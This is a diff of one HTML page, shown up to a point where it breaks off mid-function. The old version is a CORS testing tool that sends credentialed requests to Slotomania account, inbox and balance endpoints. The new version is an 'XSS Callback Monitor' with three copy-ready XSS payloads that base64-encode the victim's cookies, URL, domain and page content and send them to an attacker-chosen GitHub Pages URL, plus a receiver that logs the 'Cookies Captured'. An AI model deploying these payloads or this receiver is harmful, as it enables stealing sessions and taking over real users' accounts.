@@ -1,1237 +1,342 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Slotomania CORS Verifier</title>
+    <title>Security Research Callback</title>
     <style>
-        :root {
-            --bg: #0d1117;
-            --panel: #161b22;
-            --panel-2: #1f2630;
-            --text: #e6edf3;
-            --muted: #9ba7b4;
-            --accent: #58a6ff;
-            --accent-2: #7ee787;
-            --ok: #3fb950;
-            --warn: #d29922;
-            --bad: #f85149;
-            --border: #30363d;
-        }
-
-        * {
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0a0a1a;
+            color: #e0e0e0;
             min-height: 100vh;
-            background: var(--bg);
-            color: var(--text);
-            font-family: "Segoe UI", Arial, sans-serif;
             padding: 20px;
         }
-
-        .shell {
-            max-width: 1180px;
-            margin: 0 auto;
-            display: grid;
-            gap: 18px;
+        .container { max-width: 900px; margin: 0 auto; }
+        h1 {
+            font-size: 1.8em;
+            background: linear-gradient(135deg, #00ff88, #00aaff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
         }
-
-        .hero,
-        .panel,
-        .result-card {
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-radius: 10px;
+        .subtitle { color: #888; margin-bottom: 30px; font-size: 0.9em; }
+        .stats {
+            display: flex; gap: 15px; margin-bottom: 30px;
         }
-
-        .hero {
-            padding: 20px;
-            display: grid;
-            gap: 14px;
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 15px 25px;
+            flex: 1;
+            text-align: center;
         }
-
-        .hero h1 {
-            margin: 0;
-            font-size: clamp(1.7rem, 2vw, 2.4rem);
-            letter-spacing: 0.02em;
-        }
-
-        .hero p,
-        .meta,
-        .help,
-        .field-note,
-        .small {
-            color: var(--muted);
-        }
-
-        .hero-grid,
-        .controls,
-        .toggle-row,
-        .summary-grid,
-        .result-grid {
-            display: grid;
-            gap: 14px;
-        }
-
-        .hero-grid,
-        .summary-grid {
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-        }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            width: fit-content;
-            padding: 8px 12px;
-            border-radius: 999px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--border);
-            color: var(--text);
-            font-size: 0.9rem;
-        }
-
-        .meta-card {
-            padding: 14px 16px;
-            background: var(--panel-2);
-            border-radius: 8px;
-            border: 1px solid var(--border);
-        }
-
-        .meta-label {
-            font-size: 0.76rem;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: var(--accent-2);
-        }
-
-        .meta-value {
-            margin-top: 7px;
-            font-weight: 600;
-            overflow-wrap: anywhere;
-        }
-
-        .panel {
-            padding: 18px;
-        }
-
-        .panel h2 {
-            margin: 0 0 12px 0;
-            font-size: 1.1rem;
-        }
-
-        .controls {
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-        }
-
-        .field {
-            display: grid;
-            gap: 8px;
-        }
-
-        label {
-            font-size: 0.92rem;
-            font-weight: 600;
-        }
-
-        input[type="text"],
-        textarea {
-            width: 100%;
-            background: var(--panel);
-            color: var(--text);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 14px;
-            font: inherit;
-        }
-
-        textarea {
-            min-height: 104px;
-            resize: vertical;
-            font-family: "IBM Plex Mono", Consolas, monospace;
-            font-size: 0.9rem;
-        }
-
-        .toggle-row {
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            margin-top: 16px;
-        }
-
-        .toggle {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--panel-2);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 14px;
-        }
-
-        .actions {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            margin-top: 18px;
-        }
-
-        button {
-            border: none;
-            border-radius: 8px;
-            padding: 13px 18px;
-            font: inherit;
+        .stat-card .num {
+            font-size: 2em;
             font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.16s ease, opacity 0.16s ease, background 0.16s ease;
+            color: #00ff88;
         }
-
-        button:hover:not(:disabled) {
-            transform: translateY(-1px);
+        .stat-card .label { font-size: 0.8em; color: #888; }
+        .hit {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(0,255,136,0.2);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            animation: fadeIn 0.5s ease;
         }
-
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
+        .hit.new {
+            border-color: #ff4444;
+            background: rgba(255,68,68,0.05);
         }
-
-        .primary {
-            background: var(--accent);
-            color: #081018;
-        }
-
-        .secondary {
-            background: #2d333b;
-            color: var(--text);
-        }
-
-        .ghost {
-            background: transparent;
-            border: 1px solid var(--border);
-            color: var(--text);
-        }
-
-        .summary-grid {
-            margin-top: 14px;
-        }
-
-        .summary-card {
-            padding: 14px 16px;
-            background: var(--panel-2);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-        }
-
-        .summary-card strong {
-            display: block;
-            margin-bottom: 6px;
-        }
-
-        .result-grid {
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-        }
-
-        .result-card {
-            padding: 18px;
-            display: grid;
-            gap: 12px;
-        }
-
-        .result-head {
+        .hit-header {
             display: flex;
             justify-content: space-between;
-            gap: 12px;
-            align-items: start;
+            align-items: center;
+            margin-bottom: 12px;
         }
-
-        .result-title {
-            margin: 0;
-            font-size: 1rem;
+        .hit-time {
+            color: #00aaff;
+            font-size: 0.85em;
+            font-weight: 600;
         }
-
-        .status-pill {
-            white-space: nowrap;
-            padding: 6px 10px;
-            border-radius: 999px;
-            font-size: 0.82rem;
+        .hit-badge {
+            background: #00ff88;
+            color: #000;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.75em;
             font-weight: 700;
         }
-
-        .status-ok {
-            background: rgba(68, 209, 122, 0.12);
-            color: var(--ok);
+        .hit-badge.alert {
+            background: #ff4444;
+            color: #fff;
         }
-
-        .status-warn {
-            background: rgba(255, 209, 102, 0.12);
-            color: var(--warn);
+        .data-row {
+            display: flex;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.85em;
         }
-
-        .status-bad {
-            background: rgba(255, 93, 115, 0.12);
-            color: var(--bad);
+        .data-label {
+            color: #00aaff;
+            min-width: 120px;
+            font-weight: 600;
         }
-
-        .kv {
-            display: grid;
-            gap: 8px;
-            font-size: 0.92rem;
+        .data-value {
+            color: #ccc;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
         }
-
-        .kv div {
-            display: grid;
-            gap: 4px;
+        .no-hits {
+            text-align: center;
+            padding: 60px 20px;
+            color: #555;
         }
-
-        .kv span {
-            color: var(--muted);
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
+        .no-hits .icon { font-size: 3em; margin-bottom: 15px; }
+        .pulse {
+            display: inline-block;
+            width: 10px; height: 10px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+            margin-right: 8px;
         }
-
-        pre {
-            margin: 0;
-            padding: 14px;
-            background: #0b0f14;
-            color: #c8defe;
-            border: 1px solid var(--border);
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,255,136,0.7); }
+            50% { opacity: 0.7; box-shadow: 0 0 0 10px rgba(0,255,136,0); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .payload-box {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 8px;
-            overflow: auto;
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-family: "IBM Plex Mono", Consolas, monospace;
-            font-size: 0.84rem;
-            line-height: 1.45;
-            max-height: 300px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            color: #ff8800;
+            word-break: break-all;
+            cursor: pointer;
+            position: relative;
         }
-
-        .empty {
-            padding: 18px;
-            border-radius: 8px;
-            border: 1px dashed var(--border);
-            color: var(--muted);
+        .payload-box:hover { border-color: #ff8800; }
+        .payload-box .copy-hint {
+            position: absolute; top: 5px; right: 10px;
+            font-size: 0.7em; color: #666;
         }
-
-        .export-note {
-            margin-top: 10px;
-            color: var(--muted);
-            font-size: 0.9rem;
+        .section-title {
+            color: #00aaff;
+            font-size: 1.1em;
+            margin: 25px 0 10px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(0,170,255,0.2);
         }
-
-        @media (max-width: 720px) {
-            body {
-                padding: 16px;
-            }
-
-            .panel,
-            .hero,
-            .result-card {
-                border-radius: 14px;
-            }
-
-            .actions {
-                flex-direction: column;
-            }
-
-            button {
-                width: 100%;
-            }
-        }
+        #status { font-size: 0.9em; }
     </style>
 </head>
-
 <body>
-    <div class="shell">
-        <section class="hero">
-            <div class="badge">Authorized own-account verifier</div>
-            <div>
-                <h1>REAL CORS verifier</h1>
-                <p>
-                    This page validates whether Slotomania endpoints are readable cross-origin from your hosted GitHub
-                    Pages origin. It keeps everything local in this tab and is intended for your own authorized test
-                    account only.
+    <div class="container">
+        <h1>🔒 XSS Callback Monitor</h1>
+        <p class="subtitle">
+            <span class="pulse"></span>
+            <span id="status">Listening for callbacks...</span>
+        </p>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="num" id="hit-count">0</div>
+                <div class="label">Total Hits</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="cookie-count">0</div>
+                <div class="label">Cookies Captured</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="unique-origins">0</div>
+                <div class="label">Unique Origins</div>
+            </div>
+        </div>
+
+        <h3 class="section-title">📡 Captured Callbacks</h3>
+        <div id="hits-container">
+            <div class="no-hits">
+                <div class="icon">📡</div>
+                <p>No callbacks received yet.</p>
+                <p style="margin-top:8px; font-size:0.85em;">
+                    Waiting for XSS payload to execute on target...
                 </p>
             </div>
+        </div>
 
-            <div class="hero-grid">
-                <div class="meta-card">
-                    <div class="meta-label">Current origin</div>
-                    <div class="meta-value" id="currentOrigin"></div>
-                </div>
-                <div class="meta-card">
-                    <div class="meta-label">Expected host path</div>
-                    <div class="meta-value">https://ytdevbud.github.io/wooga-takeover-poc/</div>
-                </div>
-                <div class="meta-card">
-                    <div class="meta-label">Verification goal</div>
-                    <div class="meta-value">Readable auth material, profile fields, inbox data, or other PII indicators
-                    </div>
-                </div>
-                <div class="meta-card">
-                    <div class="meta-label">Last run mode</div>
-                    <div class="meta-value" id="lastRunMode">none</div>
-                </div>
-            </div>
-        </section>
+        <h3 class="section-title">🎯 XSS Payloads</h3>
+        <p style="color:#888; font-size:0.85em; margin-bottom:10px;">
+            Replace <code style="color:#ff8800;">YOUR_GITHUB_PAGES_URL</code> with your actual GitHub Pages URL. Click to copy.
+        </p>
 
-        <section class="panel">
-            <h2>Inputs</h2>
-            <div class="controls">
-                <div class="field">
-                    <label for="sessionId">Session_id header</label>
-                    <input id="sessionId" type="text" placeholder="Optional. Paste your own Session_id here">
-                    <div class="field-note">Needed for the manual-header checks on many authenticated GET endpoints.
-                    </div>
-                </div>
-                <div class="field">
-                    <label for="sessionToken">Sessiontoken header</label>
-                    <textarea id="sessionToken" placeholder="Optional. Paste your own Sessiontoken JWT here"></textarea>
-                    <div class="field-note">Use only your own token. This page never transmits results anywhere except
-                        the target endpoint you are testing.</div>
-                </div>
-                <div class="field">
-                    <label for="refreshToken">Refresh token body value</label>
-                    <textarea id="refreshToken"
-                        placeholder="Optional. Paste the long refreshToken JWT used by /sm/login-service/v2/refresh"></textarea>
-                    <div class="field-note">This enables the refresh-flow test for cross-origin token issuance.</div>
-                </div>
-            </div>
+        <div class="payload-box" onclick="copyPayload(this)">
+            <span class="copy-hint">📋 Click to copy</span>
+            &lt;img src=x onerror="var i=new Image();i.src='YOUR_GITHUB_PAGES_URL?c='+btoa(document.cookie)+'&u='+btoa(document.URL)+'&d='+btoa(document.domain)+'&t='+Date.now()"&gt;
+        </div>
 
-            <div class="toggle-row">
-                <label class="toggle">
-                    <input id="useCookies" type="checkbox" checked>
-                    <span>Include browser cookies with fetch requests</span>
-                </label>
-                <label class="toggle">
-                    <input id="maskSensitive" type="checkbox" checked>
-                    <span>Mask long secrets and token-like values in the rendered output</span>
-                </label>
-            </div>
+        <div class="payload-box" onclick="copyPayload(this)" style="margin-top:10px;">
+            <span class="copy-hint">📋 Click to copy</span>
+            &lt;script&gt;fetch('YOUR_GITHUB_PAGES_URL?c='+btoa(document.cookie)+'&u='+btoa(document.URL)+'&d='+btoa(document.domain)+'&dom='+btoa(document.body.innerHTML.substring(0,500)))&lt;/script&gt;
+        </div>
 
-            <div class="actions">
-                <button class="primary" id="chainBtn">Run refresh-token chain</button>
-                <button class="primary" id="cookieBtn">Run cookie-only checks</button>
-                <button class="secondary" id="manualBtn">Run manual-token checks</button>
-                <button class="secondary" id="exportJsonBtn" disabled>Export JSON evidence</button>
-                <button class="secondary" id="exportMdBtn" disabled>Export Markdown summary</button>
-                <button class="ghost" id="clearBtn">Clear results</button>
-            </div>
-            <div class="export-note" id="exportNote">
-                Exports always contain the most recent run. If you want chain evidence, run <code>Run refresh-token chain</code> first and then export.
-            </div>
-
-            <div class="summary-grid" id="summary"></div>
-        </section>
-
-        <section class="panel">
-            <h2>Results</h2>
-            <div class="help">
-                A strong result is a cross-origin <code>200</code> on an authenticated endpoint with readable JSON that
-                includes auth artifacts, account identifiers, email-like fields, chat-like fields, or profile data from
-                your own account.
-            </div>
-            <div class="help">
-                If you only see <code>resultCode: -1104</code>, the request reached the API but did not have a fresh
-                valid app-auth context. The refresh-token chain below is the path that has been confirmed to work.
-            </div>
-            <div class="result-grid" id="results">
-                <div class="empty">No checks have been run yet.</div>
-            </div>
-        </section>
+        <div class="payload-box" onclick="copyPayload(this)" style="margin-top:10px;">
+            <span class="copy-hint">📋 Click to copy (stealth)</span>
+            &lt;img src=x onerror="var x=new XMLHttpRequest();x.open('GET','YOUR_GITHUB_PAGES_URL?c='+btoa(document.cookie)+'&u='+btoa(document.URL)+'&d='+btoa(document.domain));x.send()"&gt;
+        </div>
     </div>
 
     <script>
-        const currentOriginEl = document.getElementById("currentOrigin");
-        const lastRunModeEl = document.getElementById("lastRunMode");
-        const summaryEl = document.getElementById("summary");
-        const resultsEl = document.getElementById("results");
-        const chainBtn = document.getElementById("chainBtn");
-        const cookieBtn = document.getElementById("cookieBtn");
-        const manualBtn = document.getElementById("manualBtn");
-        const exportJsonBtn = document.getElementById("exportJsonBtn");
-        const exportMdBtn = document.getElementById("exportMdBtn");
-        const exportNoteEl = document.getElementById("exportNote");
-        const clearBtn = document.getElementById("clearBtn");
-        const useCookiesEl = document.getElementById("useCookies");
-        const maskSensitiveEl = document.getElementById("maskSensitive");
-        const sessionIdEl = document.getElementById("sessionId");
-        const sessionTokenEl = document.getElementById("sessionToken");
-        const refreshTokenEl = document.getElementById("refreshToken");
-        const BUG_BOUNTY_HEADER_VALUE = "True";
-
-        let lastRun = null;
-
-        currentOriginEl.textContent = window.location.href;
-
-        const COOKIE_TESTS = [
-            {
-                id: "profile",
-                title: "Public profile",
-                method: "GET",
-                url: "https://play.slotomania.com/user-profile/v2/public/profile"
-            },
-            {
-                id: "tutorials",
-                title: "Tutorial state",
-                method: "GET",
-                url: "https://play.slotomania.com/tutorial-api/tutorials"
-            },
-            {
-                id: "inapps",
-                title: "Inbox / in-apps",
-                method: "GET",
-                url: "https://play.slotomania.com/sm/inapps/"
-            },
-            {
-                id: "player-details",
-                title: "Player profile details",
-                method: "GET",
-                url: "https://play.slotomania.com/player-profile-api/client/details"
-            },
-            {
-                id: "payment-pages",
-                title: "Payment page template",
-                method: "GET",
-                url: "https://play.slotomania.com/payment-page-template/client/getPaymentPages"
-            },
-            {
-                id: "balances",
-                title: "Internal purchase balances",
-                method: "GET",
-                url: "https://play.slotomania.com/sm/internal-purchase/ips-api/v2/balances"
-            }
-        ];
-
-        const MANUAL_TESTS = [
-            {
-                id: "session-auth-token",
-                title: "User service auth token",
-                method: "POST",
-                url: "https://play.slotomania.com/sm/client-api/ClientApi/userservice/getSessionToken.do",
-                buildBody() {
-                    return {};
-                },
-                needsSessionHeaders: true
-            },
-            {
-                id: "profile-manual",
-                title: "Public profile via manual headers",
-                method: "GET",
-                url: "https://play.slotomania.com/user-profile/v2/public/profile",
-                needsSessionHeaders: true
-            },
-            {
-                id: "tutorials-manual",
-                title: "Tutorial state via manual headers",
-                method: "GET",
-                url: "https://play.slotomania.com/tutorial-api/tutorials",
-                needsSessionHeaders: true
-            },
-            {
-                id: "player-details-manual",
-                title: "Player details via manual headers",
-                method: "GET",
-                url: "https://play.slotomania.com/player-profile-api/client/details",
-                needsSessionHeaders: true
-            }
-        ];
-
-        const CHAIN_TESTS = [
-            {
-                id: "profile-chain",
-                title: "Profile with fresh session",
-                method: "GET",
-                url: "https://play.slotomania.com/user-profile/v2/public/profile"
-            },
-            {
-                id: "auth-token-chain",
-                title: "User service auth token",
-                method: "POST",
-                url: "https://play.slotomania.com/sm/client-api/ClientApi/userservice/getSessionToken.do",
-                buildBody() {
-                    return {};
-                }
-            },
-            {
-                id: "inapps-chain",
-                title: "Inbox / in-apps with fresh session",
-                method: "GET",
-                url: "https://play.slotomania.com/sm/inapps/"
-            },
-            {
-                id: "tutorials-chain",
-                title: "Tutorial state with fresh session",
-                method: "GET",
-                url: "https://play.slotomania.com/tutorial-api/tutorials"
-            },
-            {
-                id: "payment-pages-chain",
-                title: "Payment page template with fresh session",
-                method: "GET",
-                url: "https://play.slotomania.com/payment-page-template/client/getPaymentPages"
-            }
-        ];
-
-        const PII_PATTERNS = [
-            /email/i,
-            /full.?name/i,
-            /first.?name/i,
-            /last.?name/i,
-            /phone/i,
-            /birth/i,
-            /dob/i,
-            /passport/i,
-            /driver/i,
-            /credit/i,
-            /device/i,
-            /chat/i,
-            /message/i
-        ];
-
-        const AUTH_PATTERNS = [
-            /token/i,
-            /session/i,
-            /auth/i,
-            /jwt/i,
-            /credential/i,
-            /userid/i,
-            /username/i,
-            /reference/i,
-            /userreferenceid/i,
-            /ocid/i
-        ];
-
-        function setBusy(busy) {
-            chainBtn.disabled = busy;
-            cookieBtn.disabled = busy;
-            manualBtn.disabled = busy;
-            exportJsonBtn.disabled = busy || !lastRun;
-            exportMdBtn.disabled = busy || !lastRun;
-        }
-
-        function formatModeLabel(mode) {
-            if (!mode) {
-                return "none";
-            }
-            if (mode === "chain") {
-                return "chain";
-            }
-            if (mode === "cookie") {
-                return "cookie";
-            }
-            if (mode === "manual") {
-                return "manual";
-            }
-            return mode;
-        }
-
-        function updateExportState() {
-            exportJsonBtn.disabled = !lastRun;
-            exportMdBtn.disabled = !lastRun;
-            lastRunModeEl.textContent = formatModeLabel(lastRun && lastRun.mode);
-            if (!lastRun) {
-                exportJsonBtn.textContent = "Export JSON evidence";
-                exportMdBtn.textContent = "Export Markdown summary";
-                exportNoteEl.innerHTML = 'Exports always contain the most recent run. If you want chain evidence, run <code>Run refresh-token chain</code> first and then export.';
-                return;
-            }
-
-            exportJsonBtn.textContent = `Export ${formatModeLabel(lastRun.mode)} JSON`;
-            exportMdBtn.textContent = `Export ${formatModeLabel(lastRun.mode)} Markdown`;
-            exportNoteEl.innerHTML = `Current export target: <code>${formatModeLabel(lastRun.mode)}</code> run from <code>${lastRun.ranAt}</code>.`;
-        }
-
-        function clearResults() {
-            lastRun = null;
-            summaryEl.innerHTML = "";
-            resultsEl.innerHTML = '<div class="empty">No checks have been run yet.</div>';
-            updateExportState();
-        }
-
-        function clearVisualResults() {
-            summaryEl.innerHTML = "";
-            resultsEl.innerHTML = '<div class="empty">No checks have been run yet.</div>';
-        }
-
-        function maskString(value) {
-            if (typeof value !== "string") {
-                return value;
-            }
-
-            if (value.length <= 12) {
-                return value;
-            }
-
-            return `${value.slice(0, 6)}...${value.slice(-4)} [len=${value.length}]`;
-        }
-
-        function sanitizePayload(value, depth = 0) {
-            if (!maskSensitiveEl.checked) {
-                return value;
-            }
-
-            if (depth > 4) {
-                return "[depth-trimmed]";
-            }
-
-            if (Array.isArray(value)) {
-                return value.slice(0, 8).map((item) => sanitizePayload(item, depth + 1));
-            }
-
-            if (value && typeof value === "object") {
-                const out = {};
-                const entries = Object.entries(value).slice(0, 30);
-                for (const [key, entryValue] of entries) {
-                    if (AUTH_PATTERNS.some((pattern) => pattern.test(key)) || PII_PATTERNS.some((pattern) => pattern.test(key))) {
-                        out[key] = typeof entryValue === "string" ? maskString(entryValue) : sanitizePayload(entryValue, depth + 1);
-                    } else {
-                        out[key] = sanitizePayload(entryValue, depth + 1);
-                    }
-                }
-                return out;
-            }
-
-            if (typeof value === "string") {
-                const looksSensitive = value.length > 40 || value.includes(".") || /^[A-Za-z0-9_-]{20,}$/.test(value);
-                return looksSensitive ? maskString(value) : value;
-            }
-
-            return value;
-        }
-
-        function extractSignals(value, path = "$", signals = { pii: [], auth: [] }) {
-            if (Array.isArray(value)) {
-                value.slice(0, 12).forEach((item, index) => extractSignals(item, `${path}[${index}]`, signals));
-                return signals;
-            }
-
-            if (!value || typeof value !== "object") {
-                return signals;
-            }
-
-            for (const [key, entryValue] of Object.entries(value)) {
-                const nextPath = `${path}.${key}`;
-                if (PII_PATTERNS.some((pattern) => pattern.test(key))) {
-                    signals.pii.push(nextPath);
-                }
-                if (AUTH_PATTERNS.some((pattern) => pattern.test(key))) {
-                    signals.auth.push(nextPath);
-                }
-                if (entryValue && typeof entryValue === "object") {
-                    extractSignals(entryValue, nextPath, signals);
-                }
-            }
-
-            return signals;
-        }
-
-        function buildHeaders(test) {
-            const headers = new Headers();
-            headers.set("X-Bug-Bounty", BUG_BOUNTY_HEADER_VALUE);
-
-            if (test.method === "POST") {
-                headers.set("Content-Type", "application/json");
-            }
-
-            if (test.needsSessionHeaders) {
-                const sessionId = sessionIdEl.value.trim();
-                const sessionToken = sessionTokenEl.value.trim();
-                if (sessionId) {
-                    headers.set("Session_id", sessionId);
-                }
-                if (sessionToken) {
-                    headers.set("Sessiontoken", sessionToken);
-                }
-            }
-
-            return headers;
-        }
-
-        function decodeJwtPayload(token) {
-            const parts = token.split(".");
-            if (parts.length < 2) {
-                throw new Error("JWT payload not found");
-            }
-
-            const payload = parts[1].replace(/-/g, "+").replace(/_/g, "/");
-            const padded = payload + "=".repeat((4 - (payload.length % 4 || 4)) % 4);
-            return JSON.parse(atob(padded));
-        }
-
-        function classifyRun(mode, items) {
-            const readableSensitive = items.some((item) => item.ok && (item.piiPaths.length || item.authPaths.length));
-            if (mode === "cookie" && readableSensitive) {
-                return "Strongest path found: browser-managed auth produced readable sensitive data.";
-            }
-            if (mode === "chain" && readableSensitive) {
-                return "Validated token-redemption chain: readable auth or account data after cross-origin session minting.";
-            }
-            if (mode === "manual" && readableSensitive) {
-                return "Manual-token validation succeeded, but this still depends on attacker-supplied auth material.";
-            }
-            if (mode === "cookie") {
-                return "No standalone cookie-only compromise evidence yet.";
-            }
-            return "Readable responses were observed, but the current run does not prove standalone victim compromise.";
-        }
-
-        function persistRun(mode, items) {
-            lastRun = {
-                mode,
-                ranAt: new Date().toISOString(),
-                origin: window.location.href,
-                bugBountyHeader: BUG_BOUNTY_HEADER_VALUE,
-                classification: classifyRun(mode, items),
-                items
+        // ====== XSS CALLBACK RECEIVER ======
+        // When this page is loaded with query params, it captures and stores the data
+        
+        const params = new URLSearchParams(window.location.search);
+        const hashParams = new URLSearchParams(window.location.hash.substring(1));
+        
+        // Merge both query and hash params
+        const allParams = new URLSearchParams([...params, ...hashParams]);
+        
+        let hits = JSON.parse(localStorage.getItem('xss_hits') || '[]');
+        
+        // If we received callback data, store it
+        if (allParams.has('c') || allParams.has('u') || allParams.has('d') || allParams.has('data')) {
+            const hit = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                cookie: safeAtobDecode(allParams.get('c')),
+                url: safeAtobDecode(allParams.get('u')),
+                domain: safeAtobDecode(allParams.get('d')),
+                dom: safeAtobDecode(allParams.get('dom')),
+                referrer: document.referrer || 'N/A',
+                userAgent: navigator.userAgent,
+                raw: window.location.search + window.location.hash
             };
-            updateExportState();
-        }
-
-        function downloadText(filename, content, mimeType) {
-            const blob = new Blob([content], { type: mimeType });
-            const url = URL.createObjectURL(blob);
-            const anchor = document.createElement("a");
-            anchor.href = url;
-            anchor.download = filename;
-            document.body.appendChild(anchor);
-            anchor.click();
-            anchor.remove();
-            URL.revokeObjectURL(url);
-        }
-
-        function buildMarkdownReport() {
-            if (!lastRun) {
-                return "";
-            }
-
-            const lines = [
-                "# Slotomania CORS Validation",
-                "",
-                `- Run time: ${lastRun.ranAt}`,
-                `- Origin: ${lastRun.origin}`,
-                `- Validation mode: ${lastRun.mode}`,
-                `- X-Bug-Bounty header: ${lastRun.bugBountyHeader}`,
-                `- Assessment: ${lastRun.classification}`,
-                ""
-            ];
-
-            for (const item of lastRun.items) {
-                lines.push(`## ${item.title}`);
-                lines.push("");
-                lines.push(`- URL: ${item.url}`);
-                lines.push(`- Status: ${item.status} ${item.statusText}`);
-                lines.push(`- Request auth mode: ${item.requestAuthMode}`);
-                lines.push(`- Credentials mode: ${item.credentialsMode}`);
-                lines.push(`- Body readable by JS: ${item.bodyReadable ? "yes" : "no"}`);
-                lines.push(`- Content-Type: ${item.contentType || "none"}`);
-                lines.push(`- Response size: ${item.rawLength} bytes`);
-                lines.push(`- Time: ${item.elapsedMs} ms`);
-                lines.push(`- PII-like paths: ${item.piiPaths.length ? item.piiPaths.join(", ") : "none"}`);
-                lines.push(`- Auth-like paths: ${item.authPaths.length ? item.authPaths.join(", ") : "none"}`);
-                lines.push("");
-                lines.push("```json");
-                lines.push(item.preview);
-                lines.push("```");
-                lines.push("");
-            }
-
-            return lines.join("\n");
-        }
-
-        async function runFetch(test, options = {}) {
-            const headers = options.overrideHeaders || buildHeaders(test);
-            const credentialsMode = options.overrideCredentials || (useCookiesEl.checked ? "include" : "omit");
-            const init = {
-                method: test.method,
-                mode: "cors",
-                cache: "no-store",
-                credentials: credentialsMode,
-                headers
-            };
-
-            if (test.method === "POST") {
-                const bodyValue = options.overrideBody !== undefined
-                    ? options.overrideBody
-                    : JSON.stringify(test.buildBody ? test.buildBody() : {});
-                init.body = typeof bodyValue === "string" ? bodyValue : JSON.stringify(bodyValue);
-            }
-
-            const startedAt = performance.now();
-            try {
-                const response = await fetch(test.url, init);
-                const elapsedMs = Math.round(performance.now() - startedAt);
-                const text = await response.text();
-                let parsed = null;
-
-                try {
-                    parsed = text ? JSON.parse(text) : null;
-                } catch (error) {
-                    parsed = null;
-                }
-
-                const signals = parsed ? extractSignals(parsed) : { pii: [], auth: [] };
-                return {
-                    title: test.title,
-                    url: test.url,
-                    status: response.status,
-                    statusText: response.statusText,
-                    elapsedMs,
-                    ok: response.ok,
-                    piiPaths: [...new Set(signals.pii)].slice(0, 10),
-                    authPaths: [...new Set(signals.auth)].slice(0, 12),
-                    contentType: response.headers.get("content-type") || "",
-                    bodyReadable: true,
-                    credentialsMode,
-                    requestAuthMode: options.requestAuthMode || "cookies-or-none",
-                    preview: parsed ? JSON.stringify(sanitizePayload(parsed), null, 2) : text.slice(0, 2000),
-                    rawLength: text.length
-                };
-            } catch (error) {
-                return {
-                    title: test.title,
-                    url: test.url,
-                    status: "ERR",
-                    statusText: error.message,
-                    elapsedMs: Math.round(performance.now() - startedAt),
-                    ok: false,
-                    piiPaths: [],
-                    authPaths: [],
-                    contentType: "",
-                    bodyReadable: false,
-                    credentialsMode,
-                    requestAuthMode: options.requestAuthMode || "cookies-or-none",
-                    preview: `Fetch failed: ${error.message}`,
-                    rawLength: 0
-                };
+            
+            hits.unshift(hit);
+            localStorage.setItem('xss_hits', JSON.stringify(hits));
+            
+            // Update status  
+            document.getElementById('status').textContent = 
+                '🚨 NEW CALLBACK RECEIVED at ' + new Date().toLocaleTimeString();
+            document.getElementById('status').style.color = '#ff4444';
+            
+            // Clean URL to avoid re-processing on refresh
+            if (window.history.replaceState) {
+                window.history.replaceState({}, document.title, window.location.pathname);
             }
         }
-
-        function renderSummary(items) {
-            const successCount = items.filter((item) => item.ok).length;
-            const piiHits = items.filter((item) => item.piiPaths.length > 0).length;
-            const authHits = items.filter((item) => item.authPaths.length > 0).length;
-            const readableCount = items.filter((item) => item.bodyReadable).length;
-            const assessment = lastRun ? lastRun.classification : "Run a validation mode to generate an assessment.";
-
-            summaryEl.innerHTML = `
-                <div class="summary-card">
-                    <strong>Readable responses</strong>
-                    <div class="small">${successCount} / ${items.length}</div>
-                </div>
-                <div class="summary-card">
-                    <strong>PII-like fields detected</strong>
-                    <div class="small">${piiHits}</div>
-                </div>
-                <div class="summary-card">
-                    <strong>Auth-like fields detected</strong>
-                    <div class="small">${authHits}</div>
-                </div>
-                <div class="summary-card">
-                    <strong>Cookie mode</strong>
-                    <div class="small">${useCookiesEl.checked ? "include" : "omit"}</div>
-                </div>
-                <div class="summary-card">
-                    <strong>JS-readable bodies</strong>
-                    <div class="small">${readableCount}</div>
-                </div>
-                <div class="summary-card">
-                    <strong>Assessment</strong>
-                    <div class="small">${assessment}</div>
-                </div>
-            `;
+        
+        // Render all stored hits
+        renderHits();
+        
+        function safeAtobDecode(val) {
